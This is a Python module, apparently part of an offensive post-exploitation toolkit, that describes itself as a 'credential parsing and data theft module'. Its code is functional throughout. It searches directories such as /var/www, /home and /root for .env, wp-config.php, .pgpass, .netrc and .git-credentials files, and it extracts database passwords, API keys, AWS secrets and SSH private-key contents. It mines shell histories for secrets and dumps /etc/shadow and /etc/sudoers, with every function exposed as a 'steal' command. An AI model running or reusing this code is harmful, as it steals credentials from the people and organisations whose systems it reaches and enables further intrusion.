"""Credential parsing and data theft module."""

import os
import re
import subprocess

NAME = "stealing"

PASSWORD_PATTERNS = [
    (r'password\s*[=:]\s*["\']?([^\s"\';\n]+)', "password"),
    (r'passwd\s*[=:]\s*["\']?([^\s"\';\n]+)', "password"),
    (r'pass\s*[=:]\s*["\']?([^\s"\';\n]+)', "password"),
    (r'secret\s*[=:]\s*["\']?([^\s"\';\n]+)', "secret"),
    (r'api[_-]?key\s*[=:]\s*["\']?([^\s"\';\n]+)', "api_key"),
    (r'token\s*[=:]\s*["\']?([^\s"\';\n]+)', "token"),
    (r'db_pass(?:word)?\s*[=:]\s*["\']?([^\s"\';\n]+)', "database"),
    (r'DATABASE_URL\s*[=:]\s*["\']?([^\s"\';\n]+)', "database"),
    (r'AWS_SECRET_ACCESS_KEY\s*[=:]\s*["\']?([^\s"\';\n]+)', "aws"),
    (r'AWS_ACCESS_KEY_ID\s*[=:]\s*["\']?([^\s"\';\n]+)', "aws"),
    (r'PRIVATE_KEY\s*[=:]\s*["\']?([^\s"\';\n]+)', "key"),
]

CONFIG_NAMES = [
    ".env", ".env.local", ".env.production", ".env.staging", ".env.development",
    "config.php", "wp-config.php", "settings.py", "config.py", "local_settings.py",
    "database.yml", "config.yml", "config.json", "secrets.yml",
    "web.config", "appsettings.json", "appsettings.Development.json",
    ".git/config", ".gitconfig", ".git-credentials",
    ".my.cnf", ".pgpass", ".netrc",
    "credentials", "credentials.json", "service-account.json",
    "application.properties", "application.yml",
    "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
]

SEARCH_DIRS = ["/var/www", "/opt", "/srv", "/home", "/etc", "/root", "/tmp"]


def _run(cmd: str) -> str:
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=30).decode(errors="replace").strip()
    except Exception:
        return ""


def _read_file(path: str, max_bytes: int = 50000) -> str:
    try:
        with open(path, "r", errors="replace") as f:
            return f.read(max_bytes)
    except Exception:
        return ""


def _parse_env(content: str, source: str) -> list:
    creds = []
    interesting_keys = {
        "DB_PASSWORD", "DB_PASS", "DATABASE_PASSWORD", "MYSQL_PASSWORD",
        "POSTGRES_PASSWORD", "MONGO_PASSWORD", "REDIS_PASSWORD",
        "SECRET_KEY", "SECRET", "APP_SECRET", "JWT_SECRET",
        "API_KEY", "API_SECRET", "AWS_SECRET_ACCESS_KEY", "AWS_ACCESS_KEY_ID",
        "PRIVATE_KEY", "ENCRYPTION_KEY", "AUTH_TOKEN", "ACCESS_TOKEN",
        "MAIL_PASSWORD", "SMTP_PASSWORD", "EMAIL_PASSWORD",
        "S3_SECRET", "STRIPE_SECRET_KEY", "SENDGRID_API_KEY",
        "DB_USERNAME", "DB_USER", "DB_HOST", "DB_NAME", "DB_PORT",
        "DATABASE_URL", "REDIS_URL", "MONGO_URI", "AMQP_URL",
        "PASSWORD", "PASSWD", "PASS",
    }
    db_info = {}
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        match = re.match(r'^([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)', line)
        if not match:
            continue
        key, value = match.group(1), match.group(2).strip().strip("\"'")
        if not value:
            continue
        upper_key = key.upper()
        if upper_key in interesting_keys or any(kw in upper_key for kw in ["PASSWORD", "SECRET", "TOKEN", "API_KEY", "PRIVATE"]):
            cred_type = "database" if any(k in upper_key for k in ["DB_", "DATABASE", "MYSQL", "POSTGRES", "MONGO", "REDIS"]) else \
                        "api_key" if any(k in upper_key for k in ["API", "STRIPE", "SENDGRID"]) else \
                        "aws" if "AWS" in upper_key else \
                        "secret" if "SECRET" in upper_key else \
                        "token" if "TOKEN" in upper_key else "password"
            creds.append({"source": source, "type": cred_type, "key": key, "value": value})
        if upper_key.startswith("DB_") or upper_key.startswith("DATABASE_"):
            db_info[upper_key] = value
    if db_info:
        pwd = db_info.get("DB_PASSWORD") or db_info.get("DATABASE_PASSWORD")
        if pwd:
            creds.append({
                "source": source, "type": "database",
                "username": db_info.get("DB_USERNAME") or db_info.get("DB_USER", ""),
                "password": pwd,
                "host": db_info.get("DB_HOST", "localhost"),
                "database": db_info.get("DB_NAME") or db_info.get("DB_DATABASE", ""),
                "port": db_info.get("DB_PORT", ""),
            })
    return creds


def _parse_wp_config(content: str, source: str) -> list:
    creds = []
    defines = re.findall(r"define\s*\(\s*['\"](\w+)['\"]\s*,\s*['\"]([^'\"]*)['\"]", content)
    db_info = {}
    for key, value in defines:
        if key in ("DB_PASSWORD", "DB_USER", "DB_NAME", "DB_HOST"):
            db_info[key] = value
        elif key in ("AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY", "NONCE_KEY",
                      "AUTH_SALT", "SECURE_AUTH_SALT", "LOGGED_IN_SALT", "NONCE_SALT"):
            if value and value != "put your unique phrase here":
                creds.append({"source": source, "type": "secret", "key": key, "value": value})
    if db_info.get("DB_PASSWORD"):
        creds.append({
            "source": source, "type": "database",
            "username": db_info.get("DB_USER", ""),
            "password": db_info["DB_PASSWORD"],
            "host": db_info.get("DB_HOST", "localhost"),
            "database": db_info.get("DB_NAME", ""),
        })
    table_prefix = re.search(r"\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]", content)
    if table_prefix:
        creds.append({"source": source, "type": "config", "key": "table_prefix", "value": table_prefix.group(1)})
    return creds


def _parse_database_yml(content: str, source: str) -> list:
    creds = []
    current_env = None
    env_blocks = {}
    indent_level = 0
    for line in content.splitlines():
        if not line.strip() or line.strip().startswith("#"):
            continue
        leading = len(line) - len(line.lstrip())
        if leading == 0 and line.strip().endswith(":"):
            current_env = line.strip().rstrip(":")
            env_blocks[current_env] = {}
            indent_level = 0
            continue
        if current_env:
            match = re.match(r'\s+(\w+):\s*(.*)', line)
            if match:
                key, value = match.group(1), match.group(2).strip().strip("\"'")
                env_blocks[current_env][key] = value
    for env_name, config in env_blocks.items():
        pwd = config.get("password")
        if pwd:
            creds.append({
                "source": source, "type": "database",
                "environment": env_name,
                "username": config.get("username", ""),
                "password": pwd,
                "host": config.get("host", "localhost"),
                "database": config.get("database", ""),
                "adapter": config.get("adapter", ""),
            })
    return creds


def _parse_django_settings(content: str, source: str) -> list:
    creds = []
    secret_match = re.search(r"SECRET_KEY\s*=\s*['\"]([^'\"]+)['\"]", content)
    if secret_match:
        creds.append({"source": source, "type": "secret", "key": "SECRET_KEY", "value": secret_match.group(1)})
    db_matches = re.finditer(r"['\"]PASSWORD['\"]\s*:\s*['\"]([^'\"]*)['\"]", content)
    for m in db_matches:
        if m.group(1):
            surrounding = content[max(0, m.start() - 300):m.end() + 100]
            user_match = re.search(r"['\"]USER['\"]\s*:\s*['\"]([^'\"]*)['\"]", surrounding)
            host_match = re.search(r"['\"]HOST['\"]\s*:\s*['\"]([^'\"]*)['\"]", surrounding)
            name_match = re.search(r"['\"]NAME['\"]\s*:\s*['\"]([^'\"]*)['\"]", surrounding)
            creds.append({
                "source": source, "type": "database",
                "username": user_match.group(1) if user_match else "",
                "password": m.group(1),
                "host": host_match.group(1) if host_match else "localhost",
                "database": name_match.group(1) if name_match else "",
            })
    debug_match = re.search(r"DEBUG\s*=\s*(True|False)", content)
    if debug_match and debug_match.group(1) == "True":
        creds.append({"source": source, "type": "config", "key": "DEBUG", "value": "True (exposed in production?)"})
    return creds


def _parse_config_php(content: str, source: str) -> list:
    creds = []
    patterns = [
        (r"\$config\s*\[\s*['\"]password['\"]\s*\]\s*=\s*['\"]([^'\"]*)['\"]", "password"),
        (r"\$config\s*\[\s*['\"]db_password['\"]\s*\]\s*=\s*['\"]([^'\"]*)['\"]", "password"),
        (r"['\"]password['\"]\s*=>\s*['\"]([^'\"]*)['\"]", "password"),
        (r"['\"]db_pass(?:word)?['\"]\s*=>\s*['\"]([^'\"]*)['\"]", "password"),
        (r"['\"]username['\"]\s*=>\s*['\"]([^'\"]*)['\"]", "username"),
        (r"['\"]db_user(?:name)?['\"]\s*=>\s*['\"]([^'\"]*)['\"]", "username"),
        (r"['\"]host['\"]\s*=>\s*['\"]([^'\"]*)['\"]", "host"),
        (r"['\"]database['\"]\s*=>\s*['\"]([^'\"]*)['\"]", "database"),
    ]
    db_info = {}
    for pattern, field in patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            db_info[field] = matches[0]
    if db_info.get("password"):
        creds.append({
            "source": source, "type": "database",
            "username": db_info.get("username", ""),
            "password": db_info["password"],
            "host": db_info.get("host", "localhost"),
            "database": db_info.get("database", ""),
        })
    return creds


def _parse_app_properties(content: str, source: str) -> list:
    creds = []
    props = {}
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        match = re.match(r'^([^=]+)=(.+)', line)
        if match:
            props[match.group(1).strip()] = match.group(2).strip()
    interesting = {
        "spring.datasource.password": "database",
        "spring.datasource.username": "database",
        "spring.datasource.url": "database",
        "spring.data.mongodb.password": "database",
        "spring.data.mongodb.uri": "database",
        "spring.redis.password": "database",
        "spring.mail.password": "email",
        "server.ssl.key-store-password": "ssl",
        "jwt.secret": "secret",
        "api.key": "api_key",
    }
    db_info = {}
    for key, value in props.items():
        if key in interesting:
            creds.append({"source": source, "type": interesting[key], "key": key, "value": value})
            if "datasource" in key:
                db_info[key.split(".")[-1]] = value
        elif any(kw in key.lower() for kw in ["password", "secret", "token", "api-key", "api_key"]):
            creds.append({"source": source, "type": "password", "key": key, "value": value})
    return creds


def _parse_pgpass(content: str, source: str) -> list:
    creds = []
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":")
        if len(parts) >= 5:
            creds.append({
                "source": source, "type": "database",
                "host": parts[0], "port": parts[1],
                "database": parts[2], "username": parts[3],
                "password": parts[4],
            })
    return creds


def _parse_mycnf(content: str, source: str) -> list:
    creds = []
    user = ""
    password = ""
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith(";"):
            continue
        match = re.match(r'(?:user|username)\s*=\s*(.*)', line, re.IGNORECASE)
        if match:
            user = match.group(1).strip().strip("\"'")
        match = re.match(r'password\s*=\s*(.*)', line, re.IGNORECASE)
        if match:
            password = match.group(1).strip().strip("\"'")
    if password:
        creds.append({"source": source, "type": "database", "username": user, "password": password})
    return creds


def _parse_git_credentials(content: str, source: str) -> list:
    creds = []
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        match = re.match(r'https?://([^:]+):([^@]+)@(.+)', line)
        if match:
            creds.append({
                "source": source, "type": "git",
                "username": match.group(1),
                "password": match.group(2),
                "host": match.group(3),
            })
    return creds


def _parse_netrc(content: str, source: str) -> list:
    creds = []
    machines = re.findall(r'machine\s+(\S+)\s+login\s+(\S+)\s+password\s+(\S+)', content)
    for host, user, pwd in machines:
        creds.append({"source": source, "type": "netrc", "host": host, "username": user, "password": pwd})
    return creds


def _check_ssh_key(content: str, path: str) -> dict:
    encrypted = "ENCRYPTED" in content
    key_type = "unknown"
    if "RSA" in content:
        key_type = "rsa"
    elif "ED25519" in content:
        key_type = "ed25519"
    elif "ECDSA" in content:
        key_type = "ecdsa"
    elif "DSA" in content:
        key_type = "dsa"
    return {
        "source": path, "type": "ssh_key",
        "key_type": key_type, "encrypted": encrypted,
        "path": path,
    }


def _parse_file(path: str) -> list:
    content = _read_file(path)
    if not content:
        return []
    basename = os.path.basename(path)
    lower = basename.lower()

    if lower.startswith(".env"):
        return _parse_env(content, path)
    elif lower == "wp-config.php":
        return _parse_wp_config(content, path)
    elif lower == "database.yml":
        return _parse_database_yml(content, path)
    elif lower in ("settings.py", "local_settings.py"):
        return _parse_django_settings(content, path)
    elif lower == "config.php":
        return _parse_config_php(content, path)
    elif lower in ("application.properties", "application.yml"):
        return _parse_app_properties(content, path)
    elif lower == ".pgpass":
        return _parse_pgpass(content, path)
    elif lower == ".my.cnf":
        return _parse_mycnf(content, path)
    elif lower == ".git-credentials":
        return _parse_git_credentials(content, path)
    elif lower == ".netrc":
        return _parse_netrc(content, path)
    elif lower in ("id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"):
        if "PRIVATE KEY" in content:
            return [_check_ssh_key(content, path)]
        return []
    else:
        return _parse_generic(content, path)


def _parse_generic(content: str, source: str) -> list:
    creds = []
    seen = set()
    for pattern, cred_type in PASSWORD_PATTERNS:
        for match in re.finditer(pattern, content, re.IGNORECASE):
            value = match.group(1)
            if value and len(value) > 2 and value not in seen:
                if value.lower() in ("true", "false", "null", "none", "yes", "no", "password", "secret", "token"):
                    continue
                seen.add(value)
                line_start = content.rfind("\n", 0, match.start()) + 1
                line_end = content.find("\n", match.end())
                if line_end == -1:
                    line_end = len(content)
                context_line = content[line_start:line_end].strip()
                key_match = re.match(r'["\']?([A-Za-z_][A-Za-z0-9_]*)["\']?\s*[=:]', context_line)
                key = key_match.group(1) if key_match else ""
                creds.append({"source": source, "type": cred_type, "key": key, "value": value})
    return creds


def _discover_config_files(search_dirs: list = None) -> list:
    if search_dirs is None:
        search_dirs = SEARCH_DIRS
    found_paths = set()
    for search_dir in search_dirs:
        if not os.path.isdir(search_dir):
            continue
        for config_name in CONFIG_NAMES:
            results = _run(f"find {search_dir} -name '{config_name}' -readable -type f 2>/dev/null").splitlines()
            for fp in results:
                fp = fp.strip()
                if fp:
                    found_paths.add(fp)
    extra_patterns = ["*.env", ".env.*"]
    for search_dir in search_dirs:
        if not os.path.isdir(search_dir):
            continue
        for pattern in extra_patterns:
            results = _run(f"find {search_dir} -name '{pattern}' -readable -type f 2>/dev/null").splitlines()
            for fp in results:
                fp = fp.strip()
                if fp:
                    found_paths.add(fp)
    return sorted(found_paths)


def cmd_steal_configs(path: str = "/") -> dict:
    search_dirs = [path] if path != "/" else SEARCH_DIRS
    config_files = _discover_config_files(search_dirs)
    all_creds = []
    for fp in config_files:
        parsed = _parse_file(fp)
        all_creds.extend(parsed)
    high_value = sum(1 for c in all_creds if c["type"] in ("database", "ssh_key", "aws") or
                     (c["type"] == "ssh_key" and not c.get("encrypted", True)))
    return {
        "credentials": all_creds,
        "total_found": len(all_creds),
        "high_value": high_value,
        "files_scanned": len(config_files),
    }


def cmd_steal_ssh() -> dict:
    results = {"keys": [], "known_hosts": [], "configs": []}
    home_dirs = ["/root"]
    if os.path.isdir("/home"):
        home_dirs += [f"/home/{d}" for d in os.listdir("/home")]

    for home in home_dirs:
        ssh_dir = os.path.join(home, ".ssh")
        if not os.path.isdir(ssh_dir):
            continue
        for f in os.listdir(ssh_dir):
            fp = os.path.join(ssh_dir, f)
            if not os.path.isfile(fp) or not os.access(fp, os.R_OK):
                continue
            try:
                with open(fp, "r", errors="replace") as fh:
                    content = fh.read()
                if "PRIVATE KEY" in content:
                    key_info = _check_ssh_key(content, fp)
                    key_info["content"] = content
                    results["keys"].append(key_info)
                elif f == "known_hosts":
                    results["known_hosts"].append({"path": fp, "entries": len(content.splitlines())})
                elif f == "config":
                    results["configs"].append({"path": fp, "content": content})
                elif f == "authorized_keys":
                    results.setdefault("authorized_keys", []).append({
                        "path": fp, "keys": len(content.strip().splitlines()),
                    })
            except Exception:
                pass
    return results


def cmd_steal_history() -> dict:
    histories = {}
    history_files = [
        ".bash_history", ".zsh_history", ".sh_history",
        ".python_history", ".mysql_history", ".psql_history",
        ".node_repl_history", ".rediscli_history",
    ]
    home_dirs = ["/root"]
    if os.path.isdir("/home"):
        home_dirs += [f"/home/{d}" for d in os.listdir("/home")]

    for home in home_dirs:
        for hf in history_files:
            fp = os.path.join(home, hf)
            if os.path.isfile(fp) and os.access(fp, os.R_OK):
                try:
                    with open(fp, "r", errors="replace") as f:
                        lines = f.readlines()
                    interesting = [l.strip() for l in lines if any(kw in l.lower() for kw in
                        ["pass", "secret", "key", "token", "curl", "wget", "ssh", "mysql", "psql", "sudo"])]
                    creds_in_history = []
                    for line_text in interesting:
                        for pattern, cred_type in PASSWORD_PATTERNS:
                            for m in re.finditer(pattern, line_text, re.IGNORECASE):
                                creds_in_history.append({"type": cred_type, "value": m.group(1), "context": line_text[:200]})
                    histories[fp] = {
                        "total_lines": len(lines),
                        "interesting": interesting[-100:],
                        "extracted_creds": creds_in_history,
                    }
                except Exception:
                    pass
    return {"histories": histories, "files_found": len(histories)}


def cmd_steal_passwords(path: str = "/", depth: int = 5) -> dict:
    found = []
    cmd = f"grep -rl --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.xml' --include='*.yml' --include='*.yaml' --include='*.json' --include='*.env' --include='*.properties' --include='*.php' --include='*.py' -i 'password\\|passwd\\|secret\\|api_key' {path} -d {depth} 2>/dev/null | head -50"
    files = _run(cmd).splitlines()

    for fp in files:
        fp = fp.strip()
        if not fp:
            continue
        parsed = _parse_file(fp)
        if parsed:
            found.extend(parsed)
        else:
            generic = _parse_generic(_read_file(fp), fp)
            found.extend(generic)
    return {"credentials": found, "total_found": len(found)}


def cmd_steal_etc() -> dict:
    results = {}
    for f in ["/etc/passwd", "/etc/shadow", "/etc/group", "/etc/sudoers"]:
        try:
            with open(f, "r") as fh:
                results[f] = fh.read()
        except PermissionError:
            results[f] = "Permission denied"
        except FileNotFoundError:
            results[f] = "Not found"
    return results


def cmd_steal_all() -> dict:
    """Runs all credential parsers, aggregates structured results, and counts high-value findings."""
    all_credentials = []
    module_results = {}

    for name, func in [("configs", cmd_steal_configs), ("ssh", cmd_steal_ssh),
                        ("history", cmd_steal_history), ("etc", cmd_steal_etc)]:
        try:
            module_results[name] = func()
        except Exception as e:
            module_results[name] = {"error": str(e)}

    if "credentials" in module_results.get("configs", {}):
        all_credentials.extend(module_results["configs"]["credentials"])

    for key_info in module_results.get("ssh", {}).get("keys", []):
        all_credentials.append({
            "source": key_info.get("path", key_info.get("source", "")),
            "type": "ssh_key",
            "encrypted": key_info.get("encrypted", True),
            "key_type": key_info.get("key_type", "unknown"),
            "path": key_info.get("path", key_info.get("source", "")),
        })

    for hist_path, hist_data in module_results.get("history", {}).get("histories", {}).items():
        for cred in hist_data.get("extracted_creds", []):
            all_credentials.append({"source": hist_path, "type": cred["type"], "value": cred["value"]})

    high_value = sum(1 for c in all_credentials if
                     c["type"] in ("database", "aws") or
                     (c["type"] == "ssh_key" and not c.get("encrypted", True)))

    return {
        "credentials": all_credentials,
        "total_found": len(all_credentials),
        "high_value": high_value,
        "modules": module_results,
    }


COMMANDS = {
    "steal_all": {"handler": cmd_steal_all, "description": "Run all credential parsers with structured output"},
    "steal_configs": {"handler": cmd_steal_configs, "description": "Discover and parse config files for credentials"},
    "steal_ssh": {"handler": cmd_steal_ssh, "description": "Steal SSH keys with encryption detection"},
    "steal_history": {"handler": cmd_steal_history, "description": "Extract credentials from command history"},
    "steal_passwords": {"handler": cmd_steal_passwords, "description": "Search and parse files for passwords"},
    "steal_etc": {"handler": cmd_steal_etc, "description": "Dump /etc/passwd, shadow, group"},
}
